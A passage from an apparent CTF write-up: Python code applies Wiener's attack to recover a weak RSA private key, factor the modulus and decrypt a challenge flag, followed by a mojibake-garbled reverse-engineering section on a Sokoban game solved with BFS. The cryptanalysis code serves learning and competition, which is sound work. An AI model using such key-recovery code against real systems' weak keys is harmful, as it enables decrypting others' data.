</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>A</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>I</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>gcd</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>A</span><span class=p>,</span> <span class=nb>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>I</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>t</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=n>p</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=o>==</span> <span class=n>n</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rational_to_quotients</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>x</span> <span class=o>//</span> <span class=n>y</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>quotients</span> <span class=o>=</span> <span class=p>[</span><span class=n>a</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>a</span> <span class=o>*</span> <span class=n>y</span> <span class=o>!=</span> <span class=n>x</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=n>y</span><span class=p>,</span> <span class=n>x</span> <span class=o>-</span> <span class=n>a</span> <span class=o>*</span> <span class=n>y</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>x</span> <span class=o>//</span> <span class=n>y</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>quotients</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>quotients</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>convergents_from_quotients</span><span class=p>(</span><span class=n>quotients</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>convergents</span> <span class=o>=</span> <span class=p>[(</span><span class=n>quotients</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>1</span><span class=p>)]</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>quotients</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>quotients_partion</span> <span class=o>=</span> <span class=n>quotients</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=n>i</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>denom</span> <span class=o>=</span> <span class=n>quotients_partion</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>  <span class=c1># åˆ†æ¯ </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=mi>1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span> <span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>quotients_partion</span><span class=p>),</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>num</span><span class=p>,</span> <span class=n>denom</span> <span class=o>=</span> <span class=n>denom</span><span class=p>,</span> <span class=n>quotients_partion</span><span class=p>[</span><span class=n>_</span><span class=p>]</span> <span class=o>*</span> <span class=n>denom</span> <span class=o>+</span> <span class=n>num</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>+=</span> <span class=n>denom</span> <span class=o>*</span> <span class=n>quotients_partion</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>convergents</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>num</span><span class=p>,</span> <span class=n>denom</span><span class=p>))</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>convergents</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>WienerAttack</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>quotients</span> <span class=o>=</span> <span class=n>rational_to_quotients</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>convergents</span> <span class=o>=</span> <span class=n>convergents_from_quotients</span><span class=p>(</span><span class=n>quotients</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>k</span><span class=p>,</span> <span class=n>d</span><span class=p>)</span> <span class=ow>in</span> <span class=n>convergents</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=ow>and</span> <span class=ow>not</span> <span class=p>(</span><span class=n>e</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=n>k</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>phi</span> <span class=o>=</span> <span class=p>(</span><span class=n>e</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=n>k</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># check if (x^2 - coef * x + n = 0) has integer roots </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>coef</span> <span class=o>=</span> <span class=n>n</span> <span class=o>-</span> <span class=n>phi</span> <span class=o>+</span> <span class=mi>1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>delta</span> <span class=o>=</span> <span class=n>coef</span> <span class=o>*</span> <span class=n>coef</span> <span class=o>-</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>n</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>delta</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=n>delta</span><span class=p>,</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=kc>True</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>d</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>P</span><span class=p>,</span> <span class=n>Q</span><span class=p>,</span> <span class=n>mod</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span> <span class=o>=</span> <span class=n>P</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span> <span class=o>=</span> <span class=n>Q</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x2</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>P</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x1</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Q</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y1</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>y2</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y1</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>y2</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span><span class=p>,</span> <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span> <span class=o>=</span> <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span><span class=p>,</span> <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y2</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=p>(</span><span class=n>x1</span> <span class=o>-</span> <span class=n>y1</span> <span class=o>**</span> <span class=mi>2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>-</span> <span class=n>y1</span> <span class=o>**</span> <span class=mi>2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>y2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>y2</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>y2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>y2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>y2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=p>(</span><span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>y2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>y2</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>y2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>myPower</span><span class=p>(</span><span class=n>P</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>mod</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>P</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>a</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>a</span> <span class=o>%</span> <span class=mi>2</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>target</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>4900663392474333511021274640586676041190209685334279465644481953732654820007817465784732552403161544491127978960528622855662226436013278818654816634231988610344582782186016441780833459265436490192924918161499546130585534712016341883862636292562878766223441301439228458011482886280440623319855294068082796058072724036574171831263278231498144433634711174601580662800543021165022020993826916028784897066067245828422668690991474561604415237342722134303009211975140707793593659250476825594367676528487883099797429162461388379576349794949052029036932537743737882862455041914136992742454025785618036422947521579196419682673</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=mi>16747204882417711556566528921331201720409686477045148358102407358649177037162364757337579737480709279957814538616282656834391036843801973604436858315398426544680221288140414500707975771367683893038710797912471910646361535977073670535351131336367114860464749825264434600778157181779675957160461431719021503108817300190687402628173857695242091154625300957259974276165473530538699640521880788598671262492360267197522031691979305758467455462308866998372462867278079383311005053482404930635325015230152289437841471244731705014411625162283665596766705850908703578792897039321331779312997615919261149792657373096116865329681</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1502537198037412138959404925273947125135815733714613113514320632189593377751418476234621558490959338311604744450862970281032410900602855827915451892812987364777765959947084373897245818509290955227026042711684121325311823058498537239012028561792486103281876155615838531477852906000341526557222599310995739831543658223880935572087312742332183395367851697095266248237233506401316404436470875195714876017630583057770038474875796980993028217458408971552567154328292460799613025812259659231108327829165282506352092076311191840744613851846363317595941811588179124381597704935053201484470162263659131968489028564549622533697954537751062579586560414593976837419255907900029822338445737875577148140312280440226776902211723292101877348185901719741368457958588921796200981975075293129980056841456107867653473926640266384852447661565261302935222903023606406288336953609068541701972215445007377344441511973422565646147322055069598488293931</span><span class=p>,</span> <span class=mi>1011403345603727408945876921250066820314220339105409921963107559195469502064003760326598913179366575981301702956740453627420761328713409390410661289472471898555514549526488404880640921605411282791715962933303870043871446613392022087329011550301515712639691076925568594867583281055065644358838017936361812762277354217939625893846603092627092038863632584999212161084360711665335337867672785946059549908812080484214952167276959823859872433687012399699321821628902087613134849101298661182346870557214136938336080489056200804879187330910338994984002258978932867300612824944744731909867671800598959017549057154534956670423369755122935318059535865610235297367836119658331560061846307081157317985910548447143673273543728783307221862568130810339529595961095105799484367002894090836242935087629943182476006427583114853476474037533007772721440732363420948049914690375136821227018708695289507462018947270591332826564337207730588105092063</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>padding</span> <span class=o>=</span> <span class=mi>105633841121800385495299323793575525757662062720618660464374134421074511358214855668399510418917564552735810735896127683524211092138747188289947813061924731524251612980721176172871908031798142300682065573614320720911139764848510512663864510199192378016664027839477108506581437250078083046615135331808942191529</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>WienerAttack</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>RSAdecompose</span><span class=p>(</span><span class=n>N</span><span class=p>,</span> <span class=n>e</span> <span class=o>*</span> <span class=n>d</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msg</span> <span class=o>=</span> <span class=n>myPower</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>**</span> <span class=mi>3</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)),</span> <span class=n>p</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>+</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>msg</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=rev>Rev</h1><h3 id=sycgame><strong>SycGame</strong></h3><p>é€†å‘åå¾—å‡ºæ˜¯ä¸€ä¸ªæ¨ç®±å­æ¸¸æˆï¼Œç»™å‡º flag çš„æ¡ä»¶æ˜¯è¿ç»­ç©æ¸¸æˆèµ¢ 5 æ¬¡ã€‚</p><p>æ¸¸æˆçš„æµç¨‹ä¸ºï¼š</p><ol><li>ç”Ÿæˆä¸€ä¸ªå›ºå®šçš„é•¿åº¦ä¸º 3001 çš„æ•°ç»„ï¼Œæ•°ç»„å€¼ä¸º 0 æˆ– 1ã€‚</li><li>éšæœºç”Ÿæˆä¸€ä¸ª 20 x 20 å¤§å°çš„åœ°å›¾ï¼Œåœ°å›¾ä¸Šæœ‰ä¸€äº›æ­£æ•´æ•°å’Œ -1ã€-2ã€-3ã€‚å¦‚æœæ˜¯ -1 åˆ™æ˜¯ç®±å­ï¼Œ-2 æ˜¯ç©å®¶ä½ç½®ï¼Œ-3 æ˜¯ç®±å­çš„ç›®çš„åœ°ã€‚å¦‚æœæ˜¯æ­£æ•´æ•°åˆ™å¯¹åº”å›ç¬¬ 1 æ­¥æ‰€å¾—çš„æ•°ç»„å°ä¸‹æ ‡ï¼Œå¦‚æœæ˜¯ 0 å°±æ˜¯ä¸èƒ½èµ°ï¼Œ1 å°±æ˜¯å¯ä»¥èµ°ã€‚</li><li>å°†åœ°å›¾ä½œä¸ºä¸€ä¸ªé•¿åº¦ä¸º 400 çš„åˆ—è¡¨è¾“å‡ºã€‚</li><li>è¯»å…¥ wã€aã€sã€d çš„è¾“å…¥ï¼Œæ ¹æ®è¾“å…¥ç§»åŠ¨ç©å®¶ä½ç½®ã€‚å¦‚æœç©å®¶ä½ç½®ç§»åŠ¨çš„æ–¹å‘æœ‰ç®±å­ï¼Œåˆ™å°†ç®±å­åŒæ–¹å‘ç§»åŠ¨ï¼ˆæ¨ç®±å­ï¼‰ï¼›å¦‚æœç®±å­ç§»åŠ¨çš„æ–¹å‘æœ‰ç›®çš„åœ°ï¼Œåˆ™å°†ç®±å­æ¨åˆ°ç›®çš„åœ°ä¸Šå¹¶ç»™ä¸€ä¸ªè®¡æ•°å™¨ +1ã€‚å¦‚æœç®±å­ä»ç›®çš„åœ°ä¸Šè¢«æ¨å¼€äº†åˆ™å°†è®¡æ•°å™¨ -1ã€‚</li><li>å½“è®¡æ•°å™¨çš„å€¼ç­‰äºç®±å­çš„æ•°é‡åˆ™æ¸¸æˆèƒœåˆ©ï¼Œå¦åˆ™å¦‚æœç©å®¶èµ°åˆ°äº†ä¸èƒ½èµ°çš„åœ°æ–¹æˆ–è€…éæ³•è¾“å…¥åˆ™æ¸¸æˆå¤±è´¥ã€‚</li></ol><p>ææ‡‚äº†è¿™ä¸ªä¹‹åå‰©ä¸‹å°±æ˜¯å†™ç®—æ³•ç©æ¸¸æˆäº†ã€‚å› ä¸ºç®±å­å’Œç›®çš„åœ°æ²¡æœ‰ç‰¹å®šçš„å…³ç³»ï¼ˆä»»ä½•ç®±å­æ¨åˆ°ä»»ä½•ç›®çš„åœ°éƒ½ç®—æˆåŠŸï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨è´ªå¿ƒå’Œ BFS æ¥æœç´¢ã€‚å…·ä½“æ–¹å¼æ˜¯å…ˆé€‰ä¸€ä¸ªæ²¡æœ‰å¤„ç†è¿‡çš„ç®±å­ï¼Œæ¥ç€ BFS æœåˆ°æœ€è¿‘çš„ç›®çš„åœ°ï¼ˆæœç´¢çš„æ—¶å€™ä¿è¯æ¨çš„æ–¹å‘çš„åæ–¹å‘æ ¼å­æ˜¯å¯ä»¥èµ°åˆ°çš„ï¼‰ã€‚å¾—åˆ°è·¯å¾„åï¼Œå¯¹äºæ¯ä¸€ä¸ªæ¨çš„æ“ä½œï¼Œä»ç©å®¶å½“å‰ä½ç½® BFS 